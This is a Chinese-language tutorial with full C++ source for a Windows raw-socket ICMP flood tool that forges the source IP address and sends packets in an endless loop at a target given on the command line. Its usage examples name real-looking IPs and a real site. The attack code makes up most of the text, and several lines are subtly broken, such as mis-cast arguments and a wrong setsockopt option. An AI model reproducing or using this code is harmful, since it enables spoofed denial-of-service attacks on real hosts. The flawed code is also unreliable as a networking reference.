下面先来介绍一下ICMP数据包结构,以及数据包的填写:

 

![图片](pic_temp3\psb1.jpg)



在这个结构里,IP头部数据和ICMP头部数据包都是不会改变数据大小的,而ICMP附加数据的数据大小是可以变化的



那么IP头部数据和ICMP头部数据的结构是怎么样的呢,下面给出C语言的数据结构

 

```c++
//ICMP 头部数据
typedef struct _ihdr
{
   BYTE i_type;  //8位类型
   BYTE i_code; //8位代码
   USHORT i_cksum; //16位校验和
   USHORT i_id;    //识别号
   USHORT i_seq; //报文序列号
   ULONG timestamp; //时间戳
}ICMP_HEADER;


//IP头部数据
typedef struct _iphdr 
{
 unsigned char h_verlen;  //4位首部长度,4位IP版本号
 unsigned char tos;           //8位服务类型TOS 
 unsigned short total_len; //16位总长度（字节） 
 unsigned short ident;       //16位标识 
 unsigned short frag_and_flags; //3位标志位 
 unsigned char ttl;       //8位生存时间 TTL 
 unsigned char proto; //8位协议 (TCP, UDP 或其他) 
 unsigned short checksum; //16位IP首部校验和 
 unsigned int sourceIP;       //32位源IP地址 
 unsigned int destIP;           //32位目的IP地址 
}IP_HEADER;



读者们可以根据这个两个头部数据结构来进行数据填写,下面我给出初始化时数据结构的一般填写方法:

//首先是ICMP头部数据填写
ICMP_HEADER sICMP;

memset(&sICMP,0,sizeof(ICMP_HEADER));

sICMP.i_type=8;
sICMP.i_code=0;
sICMP.i_id=2;
sICMP.i_seq=seq;
sICMP.timestamp=GetTickCount(); 
sICMP.i_cksum=0; 

//然后是IP头部数据填写
IP_HEADER sIP;

memset(&sIP,0,sizeof(IP_HEADER));

sIP.h_verlen=(4<<4 | sizeof(IP_HEADER)/sizeof(unsigned long)); 
sIP.total_len=htons(sizeof(IP_HEADER)+sizeof(ICMP_HEADER)); 
sIP.ident=1;
sIP.frag_and_flags=0;
sIP.ttl=128;
sIP.proto=IPPROTO_ICMP;//IP头协议填写IPPROTO_ICMP说明了这个数据包是属于ICMP数据包
sIP.checksum=0; 
sIP.sourceIP=inet_addr(&FackSourceIPAddr);// 注意要转换为网络字节,这个就是伪造IP地址
sIP.destIP=inet_addr(&DestIPAddr);// 数据包要发送的目标IP地址
//FackSourceIPAddr和DestIPAddr是指伪造IP地址和攻击目标IP地址
```



请大家注意数据结构中的



```c++
sIP.checksum=0;

sICMP.i_cksum=0;
```



在初始这个数据结构的时候并不知道将来需要发送的真实数据包大小,所以应该设置为0**,然后在所有数据都填写完成的时候填充和依次计算校验**



如何计算ICMP头部数据校验和和IP头部数据校验和



下面先引入一个计算校验和的函数:



```c++
USHORT checksum(USHORT *buffer, int size) {
   unsigned long cksum=0;
   while(size >1) {
      cksum+=*buffer++;
      size -=sizeof(USHORT);
   }
   if(size) {
      cksum += \*(UCHAR*)buffer;
   }

   cksum = (cksum >> 16) + (cksum & 0xffff);
   cksum += (cksum >>16);
   
   return (USHORT)(~cksum);
}
```



那么下面的ICMP头部数据校验和就应该这样算



```c++
ICMP_HEADER.CheckSum=checksum((USHORT) SendBuf,DataSize);

//其中 SendBuf为 发送数据缓存, DataSize 为附加数据大小
```



还需要注意的是计算校验和的前后,**首先是计算ICMP头部数据的校验,然后就是计算IP头部数据校验**



最简单的方法如下:



**先把ICMP头部数据结构写入数据缓存,然后把附加信息填充到(数据缓存地址+ICMP头部数据大小)处**



**再把IP头部数据结构写入数据缓存,然后写入ICMP头部数据结构,最后填充ICMP附加数据**



假如还是对上面的流程不理解的话,以下就是实现代码:



```c++
char send[65535]={0};

memset(&send,0,65535);// 先清空send的内存
memcpy(send,&sICMP,sizeof(sICMP));//首先写入ICMP头部数据结构到send
memset(send+sizeof(sICMP),' ',512);  //然后填充ICMP附加数据

sICMP.i_cksum =checksum((USHORT *)send,sizeof(sICMP)+512);// 计算ICMP校验和

memcpy(send,&sIP,sizeof(IP_HEADER));//注意,这样就替换了原来已经写入了send的ICMP头部数据结构
memcpy(send+sizeof(IP_HEADER),&sICMP,sizeof(ICMP_HEADER));//再写入ICMP头部数据结构
memset(send+sizeof(IP_HEADER)+sizeof(ICMP_HEADER),' ',512);//最后填充ICMP附加数据

long PackSize=sizeof(IP_HEADER)+sizeof(ICMP_HEADER)+512;//数据包总大小
sIP.checksum =checksum((USHORT *)send,PackSize);//计算IP头的校验

memcpy(send,&sIP,sizeof(IP_HEADER));//计算完了校验,IP头结构就会与之前已经写入到send(发送数据缓存)里面的IP头结构不同,所以这里复制内存的动机就是刷新原来的send(发送数据缓存),使里面的IP头被刚刚完成校验和计算的IP头所替换
```



请看一下这个时候send(发送数据缓存)的内存数据:

 

![图片](pic_temp3\psb2.jpg)

 

![图片](pic_temp3\psb3.jpg)

 

当伪造IP的数据包填写好了,下一步就是发送数据包



讲到发送数据包,我们首先需要设置Sock,让它有一些有用的特性



```c++
bool SetSockOptional(SOCKET Sock) {
	int Flag=true;
	int TimeOut=1000;

	if (setsockopt(Sock,IPPROTO_IP,true,(char *)&Flag,sizeof(int))!=SOCKET_ERROR ||
		setsockopt(Sock,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut))!=SOCKET_ERROR)
		return true;
	else
		return false;
}
```



请注意里面的两次setsockopt()



```c++
setsockopt(Sock,IPPROTO_IP,true,(char *)&Flag,sizeof(int)) 
```



**设置sock以自己填写的IP头部数据发送数据包**,如果不填写这个的话,在发送数据的时候sendto 会默认填写本机和攻击主机的IP地址,你看,本机IP不是被暴露了吗?



```c++
setsockopt(Sock,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut))
```



设置超时,假如当发送超时的时候不再等待,这样的好处就是可以防止程序假死(卡在发送数据上,因为在发送大的数据包时会因缓冲区大小和网络环境有关),[**请注意这个发送超时值应该认真考虑设置**,数值过大的话可能会导致程序性能下降,数值过小的话可能会导致数据还没有被完全发送出去而被中断发送过程(强行退出)]



大体上,一个攻击程序就可以完成了,接下来就是发送数据



```c++
sendto(s,send,PackSize,0,(struct sockaddr *)&SendAddr,sizeof(SendAddr)); 
```



这个和平常的UDP发送数据没有什么不同,只是PackSize指定了要发送的数据大小,然而SendAddr结构是这样填写的



```c++
sockaddr_in GetStructSockaddr(int IPFamily,char *DestIP)
{
	sockaddr_in sRtn;

	memset(&sRtn,0,sizeof(sRtn));
    
	sRtn.sin_addr.S_un.S_addr=inet_addr((const char *)DestIP);
	sRtn.sin_family=IPFamily;
	sRtn.sin_port=0;
    
	return sRtn;
}
```



一般情况下,攻击IPv4协议,目标IP为198.168.0.12的填写函数方法应为[事实上已经默认只是IPv4协议可用]



```c++
sockaddr_in SendAddr=GetStructSockaddr(AF_INET,(char *)"198.168.0.12");
```



一个ICMP Flood程序原理到此也就简单介绍完成了.假如觉得程序还比较简单的话,可以添加一个解析Host[域名]到IP



```c++
bool DomainToIP(char *Domain) {
    struct hostent *remoteHost;    
    struct in_addr addr;          
    remoteHost = gethostbyname(Domain);    
    if (remoteHost != NULL) { 
        for(int i=0;;i++) {
            if (remoteHost->h_addr_list[i]==NULL) break;
            addr.s_addr = *(u_long *) remoteHost->h_addr_list[i];
            printf("List %d IP:%s \n",i+1,inet_ntoa(addr));
        }
    } else return false;
    
    return true;
}
```





完整的程序代码如下 [您可以将下面的程序修改为多线程运行,示例代码只是介绍在单线程下运行]



```c++

// FackICMPFlood.cpp : Defines the entry point for the console application.

//


#include "StdAfx.h"

#include <stdio.h> 

#include <winsock2.h> 

#include <ws2tcpip.h> 



#pragma comment(lib, "ws2_32.lib")





typedef struct _ihdr

{

   BYTE i_type; 

   BYTE i_code;

   USHORT i_cksum; 

   USHORT i_id; 

   USHORT i_seq; 

   ULONG timestamp;

}ICMP_HEADER;



typedef struct _iphdr 

{

 unsigned char h_verlen;

 unsigned char tos;  

 unsigned short total_len; 

 unsigned short ident; 

 unsigned short frag_and_flags; 

 unsigned char ttl;  

 unsigned char proto;  

 unsigned short checksum; 

 unsigned int sourceIP;  

 unsigned int destIP;  

}IP_HEADER;



USHORT checksum(USHORT *buffer, int size)

{

   unsigned long cksum=0;

   while(size >1)

    {

      cksum+=*buffer++;

      size -=sizeof(USHORT);

    }

   if(size )

    {

      cksum += *(UCHAR*)buffer;

    }

   cksum = (cksum >> 16) + (cksum & 0xffff);

   cksum += (cksum >>16);

   return (USHORT)(~cksum);

}



bool InitWinsock(void)

{

WSADATA wsaData;

    if(WSAStartup(MAKEWORD(2,1),&wsaData)!=0)

return true;

else 

return false;

}



SOCKET CreateSock(void)

{

return WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED);

}



bool SetSockOptional(SOCKET Sock)

{

int Flag=true;

int TimeOut=1000;

if (setsockopt(Sock,IPPROTO_IP,true,(char *)&Flag,sizeof(int))!=SOCKET_ERROR ||

setsockopt(Sock,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut))!=SOCKET_ERROR)

return true;

else

return false;

}



sockaddr_in GetStructSockaddr(int IPFamily,char *DestIP)

{

sockaddr_in sRtn;

memset(&sRtn,0,sizeof(sRtn));

sRtn.sin_addr.S_un.S_addr=inet_addr((const char *)DestIP);

sRtn.sin_family=IPFamily;

sRtn.sin_port=0;

return sRtn;

}



ICMP_HEADER GetNewStructICMP(int type,int code,int seq)

{

ICMP_HEADER sICMP;

memset(&sICMP,0,sizeof(ICMP_HEADER));

sICMP.i_type=type;

sICMP.i_code=code;

sICMP.i_id=2;

sICMP.i_seq=seq;

sICMP.timestamp=GetTickCount(); 

sICMP.i_cksum=0; 

return sICMP;

}



IP_HEADER GetNewStructIP(const char FackSourceIPAddr,const char DestIPAddr)

{

IP_HEADER sIP;

memset(&sIP,0,sizeof(IP_HEADER));

sIP.h_verlen=(4<<4 | sizeof(IP_HEADER)/sizeof(unsigned long)); 

    sIP.total_len=htons(sizeof(IP_HEADER)+sizeof(ICMP_HEADER)); 

    sIP.ident=1;

    sIP.frag_and_flags=0;

    sIP.ttl=128;

    sIP.proto=IPPROTO_ICMP;

    sIP.checksum=0; 

    sIP.sourceIP=inet_addr(&FackSourceIPAddr);

    sIP.destIP=inet_addr(&DestIPAddr);

return sIP;

}



bool DomainToIP(char *Domain)

{

    struct hostent *remoteHost;    

    struct in_addr addr;          

    remoteHost = gethostbyname(Domain);    

    if (remoteHost != NULL)  

{ 

for(int i=0;;i++)

{

if (remoteHost->h_addr_list[i]==NULL) break;

   addr.s_addr = *(u_long *) remoteHost->h_addr_list[i];

printf("List %d IP:%s \n",i+1,inet_ntoa(addr));

}

    }

else return false;



    return true;

}



void CloseSocket(SOCKET Sock)

{

closesocket(Sock);

}



void CloseWinsock(void)

{

    WSACleanup();

}





int main(int argc, char* argv[])

{

if (argc!=3)

{

printf("%s FackIP DestIP\n",argv[0]);

printf("%s -h Host\n",argv[0]);

printf("Exple:%s 210.120.11.25 183.60.3.145",argv[0]);

printf("Exple:%s -h www.qq.com\n",argv[0]);

return 0;

}

InitWinsock ();



if (strcmp((const char *)argv[1],"-h")==0) 

{

printf("Resloving Host %s\n",argv[2]);

if (!DomainToIP((char *)argv[2])) printf("Reslove Error!\n");

CloseWinsock();

return 0;

}



SOCKET s=CreateSock ();

SetSockOptional(s);

sockaddr_in SendAddr=GetStructSockaddr (AF_INET,(char *)argv[2]);

ICMP_HEADER  sICMP=GetNewStructICMP(AF_INET,0,999);

IP_HEADER sIP=GetNewStructIP ((const char)argv[1],(const char)argv[2]);



char send[65535]={0};

memset(&send,0,sizeof(char));

memcpy(send,&sICMP,sizeof(sICMP));

memset(send+sizeof(sICMP),' ',512);

sICMP.i_cksum =checksum((USHORT *)send,sizeof(sICMP)+512);



memcpy(send,&sIP,sizeof(IP_HEADER));

memcpy(send+sizeof(IP_HEADER),&sICMP,sizeof(ICMP_HEADER));

memset(send+sizeof(IP_HEADER)+sizeof(ICMP_HEADER),' ',512);



long PackSize=sizeof(IP_HEADER)+sizeof(ICMP_HEADER)+512;

sIP.checksum =checksum((USHORT *)send,PackSize);

memcpy(send,&sIP,sizeof(IP_HEADER));



printf("Ack code ready run!\n");

printf("Target IPAddr:%s\n",argv[2]);

while(1){

printf(".");

for (int i=1;i<=1024;i++)

if (sendto(s,send,PackSize,0,(struct sockaddr *)&SendAddr,sizeof(SendAddr))==SOCKET_ERROR) printf("Error Code:%d",WSAGetLastError());

}

CloseSocket(s);

CloseWinsock();

return 0;

}
```

